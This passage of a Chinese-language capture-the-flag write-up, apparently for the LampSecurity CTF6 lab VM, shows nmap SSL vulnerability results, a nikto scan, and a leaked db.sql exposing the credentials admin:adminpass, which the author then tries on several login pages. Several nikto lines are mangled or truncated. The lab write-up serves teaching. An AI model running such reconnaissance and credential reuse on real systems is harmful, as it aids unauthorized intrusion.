<span class="token operator">|</span>           The SSL protocol 3.0, as used <span class="token keyword">in</span> OpenSSL through 1.0.1i and other
<span class="token operator">|</span>           products, uses nondeterministic CBC padding, <span class="token function">which</span> makes it easier
<span class="token operator">|</span>           <span class="token keyword">for</span> man-in-the-middle attackers to obtain cleartext data via a
<span class="token operator">|</span>           padding-oracle attack, aka the <span class="token string">"POODLE"</span> issue.
<span class="token operator">|</span>     Disclosure date: 2014-10-14
<span class="token operator">|</span>     Check results:
<span class="token operator">|</span>       TLS_RSA_WITH_AES_128_CBC_SHA
<span class="token operator">|</span>     References:
<span class="token operator">|</span>       https://cve.mitre.org/cgi-bin/cvename.cgi?name<span class="token operator">=</span>CVE-2014-3566
<span class="token operator">|</span>       https://www.imperialviolet.org/2014/10/14/poodle.html
<span class="token operator">|</span>       https://www.openssl.org/~bodo/ssl-poodle.pdf
<span class="token operator">|</span>_      https://www.securityfocus.com/bid/70574
<span class="token operator">|</span> ssl-dh-params: 
<span class="token operator">|</span>   VULNERABLE:
<span class="token operator">|</span>   Anonymous Diffie-Hellman Key Exchange MitM Vulnerability
<span class="token operator">|</span>     State: VULNERABLE
<span class="token operator">|</span>       Transport Layer Security <span class="token punctuation">(</span>TLS<span class="token punctuation">)</span> services that use anonymous
<span class="token operator">|</span>       Diffie-Hellman key exchange only provide protection against passive
<span class="token operator">|</span>       eavesdropping, and are vulnerable to active man-in-the-middle attacks
<span class="token operator">|</span>       <span class="token function">which</span> could completely compromise the confidentiality and integrity
<span class="token operator">|</span>       of any data exchanged over the resulting session.
<span class="token operator">|</span>     Check results:
<span class="token operator">|</span>       ANONYMOUS DH GROUP 1
<span class="token operator">|</span>             Cipher Suite: TLS_DH_anon_EXPORT_WITH_DES40_CBC_SHA
<span class="token operator">|</span>             Modulus Type: Safe prime
<span class="token operator">|</span>             Modulus Source: Unknown/Custom-generated
<span class="token operator">|</span>             Modulus Length: 512
<span class="token operator">|</span>             Generator Length: 8
<span class="token operator">|</span>             Public Key Length: 512
<span class="token operator">|</span>     References:
<span class="token operator">|</span>       https://www.ietf.org/rfc/rfc2246.txt
<span class="token operator">|</span>   
<span class="token operator">|</span>   Transport Layer Security <span class="token punctuation">(</span>TLS<span class="token punctuation">)</span> Protocol DHE_EXPORT Ciphers Downgrade MitM <span class="token punctuation">(</span>Logjam<span class="token punctuation">)</span>
<span class="token operator">|</span>     State: VULNERABLE
<span class="token operator">|</span>     IDs:  CVE:CVE-2015-4000  BID:74733
<span class="token operator">|</span>       The Transport Layer Security <span class="token punctuation">(</span>TLS<span class="token punctuation">)</span> protocol contains a flaw that is
<span class="token operator">|</span>       triggered when handling Diffie-Hellman key exchanges defined with
<span class="token operator">|</span>       the DHE_EXPORT cipher. This may allow a man-in-the-middle attacker
<span class="token operator">|</span>       to downgrade the security of a TLS session to 512-bit export-grade
<span class="token operator">|</span>       cryptography, <span class="token function">which</span> is significantly weaker, allowing the attacker
<span class="token operator">|</span>       to <span class="token function">more</span> easily <span class="token keyword">break</span> the encryption and monitor or tamper with
<span class="token operator">|</span>       the encrypted stream.
<span class="token operator">|</span>     Disclosure date: 2015-5-19
<span class="token operator">|</span>     Check results:
<span class="token operator">|</span>       EXPORT-GRADE DH GROUP 1
<span class="token operator">|</span>             Cipher Suite: TLS_DHE_RSA_EXPORT_WITH_DES40_CBC_SHA
<span class="token operator">|</span>             Modulus Type: Safe prime
<span class="token operator">|</span>             Modulus Source: Unknown/Custom-generated
<span class="token operator">|</span>             Modulus Length: 512
<span class="token operator">|</span>             Generator Length: 8
<span class="token operator">|</span>             Public Key Length: 512
<span class="token operator">|</span>     References:
<span class="token operator">|</span>       https://weakdh.org
<span class="token operator">|</span>       https://cve.mitre.org/cgi-bin/cvename.cgi?name<span class="token operator">=</span>CVE-2015-4000
<span class="token operator">|</span>       https://www.securityfocus.com/bid/74733
<span class="token operator">|</span>   
<span class="token operator">|</span>   Diffie-Hellman Key Exchange Insufficient Group Strength
<span class="token operator">|</span>     State: VULNERABLE
<span class="token operator">|</span>       Transport Layer Security <span class="token punctuation">(</span>TLS<span class="token punctuation">)</span> services that use Diffie-Hellman <span class="token function">groups</span>
<span class="token operator">|</span>       of insufficient strength, especially those using one of a few commonly
<span class="token operator">|</span>       shared groups, may be susceptible to passive eavesdropping attacks.
<span class="token operator">|</span>     Check results:
<span class="token operator">|</span>       WEAK DH GROUP 1
<span class="token operator">|</span>             Cipher Suite: TLS_DHE_RSA_WITH_3DES_EDE_CBC_SHA
<span class="token operator">|</span>             Modulus Type: Safe prime
<span class="token operator">|</span>             Modulus Source: Unknown/Custom-generated
<span class="token operator">|</span>             Modulus Length: 1024
<span class="token operator">|</span>             Generator Length: 8
<span class="token operator">|</span>             Public Key Length: 1024
<span class="token operator">|</span>     References:
<span class="token operator">|</span>_      https://weakdh.org
<span class="token operator">|</span> ssl-ccs-injection: 
<span class="token operator">|</span>   VULNERABLE:
<span class="token operator">|</span>   SSL/TLS MITM vulnerability <span class="token punctuation">(</span>CCS Injection<span class="token punctuation">)</span>
<span class="token operator">|</span>     State: VULNERABLE
<span class="token operator">|</span>     Risk factor: High
<span class="token operator">|</span>       OpenSSL before 0.9.8za, 1.0.0 before 1.0.0m, and 1.0.1 before 1.0.1h
<span class="token operator">|</span>       does not properly restrict processing of ChangeCipherSpec messages,
<span class="token operator">|</span>       <span class="token function">which</span> allows man-in-the-middle attackers to trigger use of a zero
<span class="token operator">|</span>       length master key <span class="token keyword">in</span> certain OpenSSL-to-OpenSSL communications, and
<span class="token operator">|</span>       consequently hijack sessions or obtain sensitive information, via
<span class="token operator">|</span>       a crafted TLS handshake, aka the <span class="token string">"CCS Injection"</span> vulnerability.
<span class="token operator">|</span>           
<span class="token operator">|</span>     References:
<span class="token operator">|</span>       https://cve.mitre.org/cgi-bin/cvename.cgi?name<span class="token operator">=</span>CVE-2014-0224
<span class="token operator">|</span>       http://www.cvedetails.com/cve/2014-0224
<span class="token operator">|</span>_      http://www.openssl.org/news/secadv_20140605.txt
995/tcp  <span class="token function">open</span>  pop3s
<span class="token operator">|</span>_sslv2-drown: ERROR: Script execution failed <span class="token punctuation">(</span>use -d to debug<span class="token punctuation">)</span>
<span class="token operator">|</span> ssl-dh-params: 
<span class="token operator">|</span>   VULNERABLE:
<span class="token operator">|</span>   Anonymous Diffie-Hellman Key Exchange MitM Vulnerability
<span class="token operator">|</span>     State: VULNERABLE
<span class="token operator">|</span>       Transport Layer Security <span class="token punctuation">(</span>TLS<span class="token punctuation">)</span> services that use anonymous
<span class="token operator">|</span>       Diffie-Hellman key exchange only provide protection against passive
<span class="token operator">|</span>       eavesdropping, and are vulnerable to active man-in-the-middle attacks
<span class="token operator">|</span>       <span class="token function">which</span> could completely compromise the confidentiality and integrity
<span class="token operator">|</span>       of any data exchanged over the resulting session.
<span class="token operator">|</span>     Check results:
<span class="token operator">|</span>       ANONYMOUS DH GROUP 1
<span class="token operator">|</span>             Cipher Suite: TLS_DH_anon_EXPORT_WITH_DES40_CBC_SHA
<span class="token operator">|</span>             Modulus Type: Safe prime
<span class="token operator">|</span>             Modulus Source: Unknown/Custom-generated
<span class="token operator">|</span>             Modulus Length: 512
<span class="token operator">|</span>             Generator Length: 8
<span class="token operator">|</span>             Public Key Length: 512
<span class="token operator">|</span>     References:
<span class="token operator">|</span>       https://www.ietf.org/rfc/rfc2246.txt
<span class="token operator">|</span>   
<span class="token operator">|</span>   Transport Layer Security <span class="token punctuation">(</span>TLS<span class="token punctuation">)</span> Protocol DHE_EXPORT Ciphers Downgrade MitM <span class="token punctuation">(</span>Logjam<span class="token punctuation">)</span>
<span class="token operator">|</span>     State: VULNERABLE
<span class="token operator">|</span>     IDs:  CVE:CVE-2015-4000  BID:74733
<span class="token operator">|</span>       The Transport Layer Security <span class="token punctuation">(</span>TLS<span class="token punctuation">)</span> protocol contains a flaw that is
<span class="token operator">|</span>       triggered when handling Diffie-Hellman key exchanges defined with
<span class="token operator">|</span>       the DHE_EXPORT cipher. This may allow a man-in-the-middle attacker
<span class="token operator">|</span>       to downgrade the security of a TLS session to 512-bit export-grade
<span class="token operator">|</span>       cryptography, <span class="token function">which</span> is significantly weaker, allowing the attacker
<span class="token operator">|</span>       to <span class="token function">more</span> easily <span class="token keyword">break</span> the encryption and monitor or tamper with
<span class="token operator">|</span>       the encrypted stream.
<span class="token operator">|</span>     Disclosure date: 2015-5-19
<span class="token operator">|</span>     Check results:
<span class="token operator">|</span>       EXPORT-GRADE DH GROUP 1
<span class="token operator">|</span>             Cipher Suite: TLS_DHE_RSA_EXPORT_WITH_DES40_CBC_SHA
<span class="token operator">|</span>             Modulus Type: Safe prime
<span class="token operator">|</span>             Modulus Source: Unknown/Custom-generated
<span class="token operator">|</span>             Modulus Length: 512
<span class="token operator">|</span>             Generator Length: 8
<span class="token operator">|</span>             Public Key Length: 512
<span class="token operator">|</span>     References:
<span class="token operator">|</span>       https://weakdh.org
<span class="token operator">|</span>       https://cve.mitre.org/cgi-bin/cvename.cgi?name<span class="token operator">=</span>CVE-2015-4000
<span class="token operator">|</span>       https://www.securityfocus.com/bid/74733
<span class="token operator">|</span>   
<span class="token operator">|</span>   Diffie-Hellman Key Exchange Insufficient Group Strength
<span class="token operator">|</span>     State: VULNERABLE
<span class="token operator">|</span>       Transport Layer Security <span class="token punctuation">(</span>TLS<span class="token punctuation">)</span> services that use Diffie-Hellman <span class="token function">groups</span>
<span class="token operator">|</span>       of insufficient strength, especially those using one of a few commonly
<span class="token operator">|</span>       shared groups, may be susceptible to passive eavesdropping attacks.
<span class="token operator">|</span>     Check results:
<span class="token operator">|</span>       WEAK DH GROUP 1
<span class="token operator">|</span>             Cipher Suite: TLS_DHE_RSA_WITH_3DES_EDE_CBC_SHA
<span class="token operator">|</span>             Modulus Type: Safe prime
<span class="token operator">|</span>             Modulus Source: Unknown/Custom-generated
<span class="token operator">|</span>             Modulus Length: 1024
<span class="token operator">|</span>             Generator Length: 8
<span class="token operator">|</span>             Public Key Length: 1024
<span class="token operator">|</span>     References:
<span class="token operator">|</span>_      https://weakdh.org
<span class="token operator">|</span> ssl-poodle: 
<span class="token operator">|</span>   VULNERABLE:
<span class="token operator">|</span>   SSL POODLE information leak
<span class="token operator">|</span>     State: VULNERABLE
<span class="token operator">|</span>     IDs:  CVE:CVE-2014-3566  BID:70574
<span class="token operator">|</span>           The SSL protocol 3.0, as used <span class="token keyword">in</span> OpenSSL through 1.0.1i and other
<span class="token operator">|</span>           products, uses nondeterministic CBC padding, <span class="token function">which</span> makes it easier
<span class="token operator">|</span>           <span class="token keyword">for</span> man-in-the-middle attackers to obtain cleartext data via a
<span class="token operator">|</span>           padding-oracle attack, aka the <span class="token string">"POODLE"</span> issue.
<span class="token operator">|</span>     Disclosure date: 2014-10-14
<span class="token operator">|</span>     Check results:
<span class="token operator">|</span>       TLS_RSA_WITH_AES_128_CBC_SHA
<span class="token operator">|</span>     References:
<span class="token operator">|</span>       https://cve.mitre.org/cgi-bin/cvename.cgi?name<span class="token operator">=</span>CVE-2014-3566
<span class="token operator">|</span>       https://www.imperialviolet.org/2014/10/14/poodle.html
<span class="token operator">|</span>       https://www.openssl.org/~bodo/ssl-poodle.pdf
<span class="token operator">|</span>_      https://www.securityfocus.com/bid/70574
<span class="token operator">|</span> ssl-ccs-injection: 
<span class="token operator">|</span>   VULNERABLE:
<span class="token operator">|</span>   SSL/TLS MITM vulnerability <span class="token punctuation">(</span>CCS Injection<span class="token punctuation">)</span>
<span class="token operator">|</span>     State: VULNERABLE
<span class="token operator">|</span>     Risk factor: High
<span class="token operator">|</span>       OpenSSL before 0.9.8za, 1.0.0 before 1.0.0m, and 1.0.1 before 1.0.1h
<span class="token operator">|</span>       does not properly restrict processing of ChangeCipherSpec messages,
<span class="token operator">|</span>       <span class="token function">which</span> allows man-in-the-middle attackers to trigger use of a zero
<span class="token operator">|</span>       length master key <span class="token keyword">in</span> certain OpenSSL-to-OpenSSL communications, and
<span class="token operator">|</span>       consequently hijack sessions or obtain sensitive information, via
<span class="token operator">|</span>       a crafted TLS handshake, aka the <span class="token string">"CCS Injection"</span> vulnerability.
<span class="token operator">|</span>           
<span class="token operator">|</span>     References:
<span class="token operator">|</span>       https://cve.mitre.org/cgi-bin/cvename.cgi?name<span class="token operator">=</span>CVE-2014-0224
<span class="token operator">|</span>       http://www.cvedetails.com/cve/2014-0224
<span class="token operator">|</span>_      http://www.openssl.org/news/secadv_20140605.txt
3306/tcp <span class="token function">open</span>  mysql
MAC Address: 00:0C:29:5C:75:70 <span class="token punctuation">(</span>VMware<span class="token punctuation">)</span>

Nmap done: 1 IP address <span class="token punctuation">(</span>1 host up<span class="token punctuation">)</span> scanned <span class="token keyword">in</span> 167.11 seconds
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>虽然很长一串，但是很多关于SSL漏洞的重复信息，且多是用于中间人攻击的，我们暂时用不上。</p>
<h3 id="nikto"><a href="#nikto" class="headerlink" title="nikto"></a>nikto</h3><h2 id="然后我们再用nikto扫一扫漏洞看看有没有什么遗漏的。-96-96-96-bash┌──-kali㉿kali-x2F-vulnhub-x2F-LampSecurity-x2F-ctf6-x2F-workSpace-└─-sudo-nikto-h-192-168-56-140-Nikto-v2-5-0"><a href="#然后我们再用nikto扫一扫漏洞看看有没有什么遗漏的。-96-96-96-bash┌──-kali㉿kali-x2F-vulnhub-x2F-LampSecurity-x2F-ctf6-x2F-workSpace-└─-sudo-nikto-h-192-168-56-140-Nikto-v2-5-0" class="headerlink" title="然后我们再用nikto扫一扫漏洞看看有没有什么遗漏的。&#96;&#96;&#96;bash┌──(kali㉿kali)-[~&#x2F;vulnhub&#x2F;LampSecurity&#x2F;ctf6&#x2F;workSpace]└─$ sudo nikto -h 192.168.56.140- Nikto v2.5.0"></a>然后我们再用nikto扫一扫漏洞看看有没有什么遗漏的。<br>&#96;&#96;&#96;bash<br>┌──(kali㉿kali)-[~&#x2F;vulnhub&#x2F;LampSecurity&#x2F;ctf6&#x2F;workSpace]<br>└─$ sudo nikto -h 192.168.56.140<br>- Nikto v2.5.0</h2><ul>
<li>Target IP:          192.168.56.140</li>
<li>Target Hostname:    192.168.56.140</li>
<li>Target Port:        80</li>
<li>Start Time:         2023-04-28 11:16:09 (GMT8)</li>
</ul>
<hr>
<ul>
<li>Server: Apache&#x2F;2.2.3 (CentOS)</li>
<li>&#x2F;: Retrieved x-powered-by header: PHP&#x2F;5.2.6.</li>
<li>&#x2F;: The anti-clickjacking X-Frame-Options header is not present. See: <a target="_blank" rel="noopener" href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options">https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options</a></li>
<li>&#x2F;: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: <a target="_blank" rel="noopener" href="https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/">https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/</a></li>
<li>&#x2F;: Cookie PHPSESSID created without the httponly flag. See: <a target="_blank" rel="noopener" href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies">https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies</a></li>
<li>Apache&#x2F;2.2.3 appears to be outdated (current is at least Apache&#x2F;2.4.54). Apache 2.2.34 is the EOL for the 2.x branch.</li>
<li>OPTIONS: Allowed HTTP Methods: GET, HEAD, POST, OPTIONS, TRACE .</li>
<li>&#x2F;: Web Server returns a valid response with junk HTTP methods which may cause false positives.</li>
<li>&#x2F;: HTTP TRACE method is active which suggests the host is vulnerable to XST. See: <a target="_blank" rel="noopener" href="https://owasp.org/www-community/attacks/Cross_Site_Tracing">https://owasp.org/www-community/attacks/Cross_Site_Tracing</a></li>
<li>&#x2F;?&#x3D;PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000: PHP reveals potentially sensitive informia certain HTTP requests that contain specific QUERY strings. See: OSVDB-12184</li>
<li>&#x2F;?&#x3D;PHPE9568F34-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive informia certain HTTP requests that contain specific QUERY strings. See: OSVDB-12184</li>
<li>&#x2F;?&#x3D;PHPE9568F35-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive informia certain HTTP requests that contain specific QUERY strings. See: OSVDB-12184</li>
<li>&#x2F;css&#x2F;: Directory indexing found.</li>
<li>&#x2F;css&#x2F;: This might be interesting.</li>
<li>&#x2F;files&#x2F;: Directory indexing found.</li>
<li>&#x2F;files&#x2F;: This might be interesting.</li>
<li>&#x2F;lib&#x2F;: Directory indexing found.</li>
<li>&#x2F;lib&#x2F;: This might be interesting.</li>
<li>&#x2F;mail&#x2F;: Cookie roundcube_sessid created without the httponly flag. See: <a target="_blank" rel="noopener" href="https://deveozilla.org/en-US/docs/Web/HTTP/Cookies">https://deveozilla.org/en-US/docs/Web/HTTP/Cookies</a></li>
<li>&#x2F;mail&#x2F;: This might be interesting.</li>
<li>&#x2F;phpmyadmin&#x2F;changelog.php: phpMyAdmin is for managing MySQL databases, and should beted or limited to authorized hosts.</li>
<li>&#x2F;phpmyadmin&#x2F;ChangeLog: Server may leak inodes via ETags, header found with file &#x2F;php&#x2F;ChangeLog, inode: 97164, size: 35791, mtime: Thu Oct 20 05:47:44 2095. See: <a target="_blank" rel="noopener" href="http://cv.org/cgi-bin/cvename.cgi?name=CVE-2003-1418">http://cv.org/cgi-bin/cvename.cgi?name=CVE-2003-1418</a></li>
<li>&#x2F;phpmyadmin&#x2F;ChangeLog: phpMyAdmin is for managing MySQL databases, and should be proor limited to authorized hosts.</li>
<li>&#x2F;sql&#x2F;: Directory indexing found.</li>
<li>&#x2F;manual&#x2F;: Web server manual found.</li>
<li>&#x2F;icons&#x2F;: Directory indexing found.</li>
<li>&#x2F;manual&#x2F;images&#x2F;: Directory indexing found.</li>
<li>&#x2F;docs&#x2F;: Directory indexing found.</li>
<li>&#x2F;icons&#x2F;README: Apache default file found. See: <a target="_blank" rel="noopener" href="https://www.vntweb.co.uk/apache-restraccess-to-iconsreadme/">https://www.vntweb.co.uk/apache-restraccess-to-iconsreadme/</a></li>
<li>&#x2F;phpmyadmin&#x2F;: phpMyAdmin directory found.</li>
<li>&#x2F;phpmyadmin&#x2F;Documentation.html: phpMyAdmin is for managing MySQL databases, and shourotected or limited to authorized hosts.</li>
<li>&#x2F;phpmyadmin&#x2F;README: phpMyAdmin is for managing MySQL databases, and should be proteclimited to authorized hosts. See: <a target="_blank" rel="noopener" href="https://typo3.org/">https://typo3.org/</a></li>
<li>&#x2F;#wp-config.php#: #wp-config.php# file found. This file contains the credentials.</li>
<li>9060 requests: 0 error(s) and 32 item(s) reported on remote host</li>
<li>End Time:           2023-04-28 11:16:34 (GMT8) (25 seconds)</li>
</ul>
<hr>
<ul>
<li>1 host(s) tested</li>
</ul>
<pre><code>
### manual web discoverd
看下来没有什么能get shell的漏洞。目前最值得看的是应该是他扫出来的这些网站目录，我们看看都有哪些内容。
```sql
/* http://192.168.56.140/sql/db.sql */
CREATE database IF NOT EXISTS cms;

use mysql;

GRANT ALL PRIVILEGES ON cms.* to &#39;sql_account&#39;@&#39;localhost&#39; IDENTIFIED BY &#39;sql_password&#39;;

use cms;

DROP TABLE IF EXISTS user;
DROP TABLE IF EXISTS event;
DROP TABLE IF EXISTS log;

CREATE TABLE IF NOT EXISTS user (
    user_id int not null auto_increment primary key,
    user_username varchar(50) not null,
    user_password varchar(32) not null
);

CREATE TABLE IF NOT EXISTS event (
    event_id int not null auto_increment primary key,
    event_title varchar(255) not null,
    event_body text,
    event_file varchar(255) default null,
    user_id int not null,
    event_hits int default 0
);

CREATE TABLE IF NOT EXISTS log (
    log_id int not null auto_increment primary key,
    log_ip varchar(20),
    log_referer varchar(255),
    log_useragent varchar(255)
);

DELETE FROM user;
DELETE FROM event;
DELETE FROM log;

INSERT INTO user SET user_id = 1, user_username=&#39;admin&#39;, user_password=md5(&#39;adminpass&#39;);

INSERT INTO event SET event_title=&#39;Mauris Vel&#39;, event_body=&#39;
&lt;p&gt;Lorem ipsum dolor sit amet, consectetur adipiscing elit. Integer pharetra nulla a velit euismod aliquam. Suspendisse potenti. Lorem ipsum dolor sit amet, consectetur adipiscing elit. Class aptent taciti sociosqu ad litora torquent per conubia nostra, per inceptos himenaeos. Vestibulum ante ipsum primis in faucibus orci luctus et ultrices posuere cubilia Curae; Duis eu felis a velit sollicitudin ullamcorper quis et sapien. Proin lacinia, mauris euismod pulvinar iaculis, elit dolor interdum ipsum, eu iaculis leo nisi sit amet enim. Phasellus nunc augue, commodo sed eleifend in, ullamcorper a sapien. Phasellus non posuere massa. Morbi sed posuere urna. Donec tincidunt congue ipsum nec vehicula. Nullam quis nulla erat. Phasellus semper pretium magna at faucibus. Pellentesque sed enim nec dui posuere blandit.&lt;/p&gt;
&lt;p&gt;Maecenas malesuada blandit mauris vel tincidunt. Praesent vitae nibh erat. Donec tincidunt blandit aliquam. Donec pulvinar suscipit viverra. Fusce vitae diam non orci adipiscing dapibus nec in tortor. Donec laoreet feugiat adipiscing. Fusce at augue dignissim mauris tincidunt tincidunt. Sed at odio ut nisi vehicula porttitor. Quisque elementum ligula et libero hendrerit lacinia ac vel eros. Class aptent taciti sociosqu ad litora torquent per conubia nostra, per inceptos himenaeos. Suspendisse ut magna sem, eget pellentesque turpis. Nam ut velit ac lorem fringilla dapibus sit amet vitae leo. Mauris non velit eu neque auctor dignissim. Nam quis ipsum ac lectus commodo adipiscing interdum placerat mi.&lt;/p&gt;&#39;,
user_id = (SELECT user_id from user where user_username = &#39;admin&#39;);


INSERT INTO event SET event_title=&#39;Proin velit lacus&#39;, event_body=&#39;&lt;p&gt;Proin velit lacus, eleifend id ullamcorper sit amet, mattis id velit. Suspendisse placerat, mi luctus feugiat lacinia, elit odio facilisis dolor, at pellentesque turpis felis tincidunt leo. Quisque quis leo dolor. Donec id nunc ut tortor posuere dictum. Aliquam lobortis auctor neque, sit amet ornare urna ultrices eu. Nunc gravida, lacus id condimentum commodo, lectus enim ultricies tellus, sit amet tempor urna augue a sem. Vestibulum pretium congue nibh ut imperdiet. Fusce ac nibh vel felis vestibulum porttitor. Praesent mattis velit a ipsum aliquam vel commodo libero porttitor. Morbi volutpat, justo nec lobortis accumsan, urna ligula malesuada tellus, pharetra vehicula massa magna ut nulla. Fusce luctus tempor pharetra. In hac habitasse platea dictumst. Etiam in neque pretium mi molestie fringilla. Etiam aliquam accumsan lorem vitae varius. &lt;/p&gt;&#39;,
user_id = (SELECT user_id from user where user_username = &#39;admin&#39;);

INSERT INTO event SET event_title=&#39;Praesent magna est&#39;, event_body=&#39;&lt;p&gt;Praesent magna est, semper vitae euismod vitae, scelerisque eu nunc. Proin sed nibh a nisl tempus fringilla vitae ac nunc. Maecenas diam ipsum, ultrices vel faucibus non, suscipit nec felis. Praesent eleifend turpis vel orci sollicitudin quis tincidunt ante dapibus. Mauris laoreet mi vel nunc lacinia nec pulvinar lectus congue. Praesent imperdiet sollicitudin urna, sit amet auctor magna eleifend vel. Lorem ipsum dolor sit amet, consectetur adipiscing elit. Vivamus elementum, magna vel venenatis pellentesque, nibh orci sollicitudin sapien, in tempor sem orci non metus. Nulla interdum feugiat ultrices. Nam egestas nulla quis dolor aliquam a iaculis arcu lobortis. Vestibulum urna leo, condimentum varius porttitor sed, tincidunt id est. Suspendisse potenti. Nulla fringilla massa ac arcu tempor molestie. Vivamus vehicula aliquet enim, eu porttitor libero suscipit non. &lt;/p&gt;&#39;,
user_id = (SELECT user_id from user where user_username = &#39;admin&#39;);

INSERT INTO event SET event_title=&#39;Suspendisse sapien orci&#39;, event_body=&#39;&lt;p&gt;Suspendisse sapien orci, luctus laoreet fringilla vitae, sodales non quam. Aliquam vel justo vel enim dapibus ullamcorper. Sed elementum lacus sed tortor imperdiet imperdiet. Maecenas a turpis vel tellus iaculis ullamcorper. Pellentesque vitae orci at dolor vestibulum pharetra sit amet ut sem. Donec nec rhoncus ligula. Suspendisse eget luctus nunc. Nam eget arcu augue, vitae condimentum magna. Etiam et fermentum erat. Fusce vehicula urna ac nisl imperdiet fringilla blandit ut quam. Nullam ultricies eros sit amet sem volutpat eget elementum augue consequat. Integer non arcu orci, in iaculis elit. Fusce eros massa, accumsan in blandit eget, suscipit sit amet nibh. Vestibulum a neque libero. Vivamus purus augue, sollicitudin eget sagittis sed, lacinia sit amet nibh. Nulla eget suscipit libero. &lt;/p&gt;&#39;,
user_id = (SELECT user_id from user where user_username = &#39;admin&#39;);
</code></pre>
<p><code>/sql</code>目录下有个<code>db.sql</code>文件，看上去像是创建网站数据时的操作，仔细看一下发现里面甚至有用户的登陆凭证：<code>admin:adminpass</code>。<br>观察一下数据库构建语句很明显是网站主页登录框的登录凭证。我们尝试登录，发现能成功登录，但是不知道为啥提示登陆成功后并不能正常跳转到管理后台，只会跳回主页。。。。<br>那这个凭证尝试登录目录发现发现的邮箱登录，phpmyadmin登录，都失败，看来没有密码复用，先找找别的路吧。</p>
